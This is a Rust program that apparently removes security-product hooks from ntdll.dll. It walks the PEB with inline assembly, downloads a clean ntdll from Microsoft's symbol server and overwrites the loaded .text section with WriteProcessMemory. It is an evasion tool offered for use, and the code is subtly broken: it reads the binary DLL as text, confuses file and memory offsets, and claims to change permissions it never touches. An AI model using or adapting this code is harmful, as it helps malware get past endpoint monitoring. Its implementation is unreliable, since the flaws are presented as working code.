use std::{arch::asm, error::Error, ffi::c_void};

use windows::Win32::System::{
    Diagnostics::Debug::WriteProcessMemory, Threading::GetCurrentProcess,
};

fn main() -> Result<(), Box<dyn Error>> {
    unsafe {
        let virtualsize: u32;
        let timestamp: u32;
        let mut ntdll: u64;

        asm!(
        " xor rcx, rcx            ", //  ;# rcx = 0
        " mov rax, gs:[rcx+60h]   ", //  ;# rax = &PEB The "fs"fragment holds the Thread Enviroment Block of the current running process. 0x60 bytes into the TEB you get the pointer to the PEB
        " mov rax, [rax+18h]      ", //  ;# rax = PEB->Ldr 0x18 bytes into the Process Env Block you get the LDR.
        " mov rax, [rax+30h]      ", //  ;# rax = PEB->Ldr.InInitOrder 0x30 bytes into the LDR you get the InInitOderModuleList
        " mov rax, [rax+10h]      ", //   ;# rbx = rax[X].base_address 0x8 bytes into the InInitOrderModuleList you get the base address of ntdll.dll
        " add rax, 0xe8           ", // PE Signature
        " mov edx, [rax+0x8]      ", //Getting timestamp of ntdll
        " mov ecx, [rax+0x50]",      //Getting virtualsize of ntdll
        " sub rax, 0xe8           ", //Restoring ntdll address.
        out ("ecx") virtualsize,
        out ("edx") timestamp,
        out ("rax") ntdll
                 );
        println!("Base address of ntdll {:x}", ntdll);
        println!("ntdll base address: {:x}", virtualsize);
        println!("Timestamp of ntdll {:x}", timestamp);
        println!("Constructing url...");
        let url = format!(
            "https://msdl.microsoft.com/download/symbols/ntdll.dll/{:x}{:x}/ntdll.dll",
            timestamp, virtualsize
        );
        println!("{}", url);
        let client = reqwest::blocking::Client::new();
        let tmp_dll = client.get(url).send()?.text()?;
        let metadata = get_ntdll_text(tmp_dll, ntdll)?;
        patch_text(metadata, ntdll)?;
    }
    println!("Ntdll.dll is unhooked!");
    Ok(())
}

unsafe fn get_ntdll_text(
    fresh_ntdll: String,
    loaded_ntdll: u64,
) -> Result<MetaData, Box<dyn Error>> {
    let text_offset: u32;
    let text_size: u32;
    asm!(
    " mov ecx, [rax+0x1f8]    ", // Size of .text section.
    " mov edx, [rax+0x1fc]     ", //Offset to .text section
    out ("ecx") text_size,
    out ("edx") text_offset,
    in ("rax") loaded_ntdll
    );
    println!(
        "Text size is {:x} and text offset is {:x}",
        text_size, text_offset
    );
    let fresh_text =
        &fresh_ntdll.as_bytes()[text_offset as usize..=(text_offset + text_size) as usize];

    let metadata = MetaData::new(text_offset, text_size, fresh_text.to_owned());

    Ok(metadata)
}
unsafe fn patch_text(metadata: MetaData, loaded_ntdll: u64) -> Result<(), Box<dyn Error>> {
    let loadedntdll_text = loaded_ntdll + metadata.offset as u64;
    println!("We changed the perms!");
    let handle = GetCurrentProcess();
    WriteProcessMemory(
        handle,
        loadedntdll_text as *const c_void,
        metadata.bytes.as_ptr() as *const c_void,
        metadata.size as usize,
        None,
    )?;
    Ok(())
}

struct MetaData {
    offset: u32,
    size: u32,
    bytes: Vec<u8>,
}

impl MetaData {
    fn new(offset: u32, size: u32, bytes: Vec<u8>) -> MetaData {
        MetaData {
            offset,
            size,
            bytes,
        }
    }
}
